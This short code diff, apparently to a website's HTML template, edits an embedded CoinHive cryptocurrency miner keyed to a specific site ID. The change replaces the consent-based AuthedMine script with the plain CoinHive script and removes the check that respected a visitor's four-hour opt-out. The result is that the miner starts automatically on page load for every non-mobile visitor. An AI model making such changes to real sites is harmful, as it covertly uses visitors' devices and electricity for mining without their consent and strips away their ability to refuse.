@@ -28,7 +28,7 @@
     fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));</script>
 
-  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
   <script>
     var miner = new CoinHive.Anonymous('nH1XfOT5PGb69He3JGjtVl6ld1v7Nps1', {
       threads: 1,
@@ -37,7 +37,7 @@
 
     // Only start on non-mobile devices and if not opted-out
     // in the last 14400 seconds (4 hours):
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    if (!miner.isMobile()) {
       miner.start();
     }
   </script>
